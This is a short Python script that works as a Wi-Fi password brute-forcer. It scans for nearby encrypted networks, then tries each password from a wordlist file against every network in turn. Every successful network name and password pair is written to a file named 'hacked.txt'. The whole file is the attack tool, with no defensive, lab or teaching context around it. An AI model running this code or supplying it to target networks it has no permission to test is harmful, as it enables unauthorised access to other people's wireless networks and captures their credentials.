import wireless
from wifi import Cell
import time
h = open('hacked.txt', 'a+')
pwd_file = open('passwords.txt')
passwords = pwd_file.read().split('\n')
bad_ssids = [
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "DIRECT-FE-HP Deskjet 2600 series"
    ]


def Search():
    while True:
        wifilist = []
        cells = Cell.all('wlan0')
        for cell in cells:
            if cell.encrypted and str(cell.ssid) not in bad_ssids:
                wifilist.append(cell)
        if len(wifilist) > 0:
            return wifilist
        else:
            print("trying to find networks")
            time.sleep(5)


ssids = Search()
wireless = wireless.Wireless()
print("first network found: ", ssids[0].ssid)

for ssid in ssids:
    network_name = str(ssid.ssid)
    print(network_name)
    for pw in passwords:
        if wireless.connect(ssid=network_name, password=pw):
            line = "ssid: " + network_name + ", pwd: " + pw + "\n"
            h.write(line)
            print(line)
            break
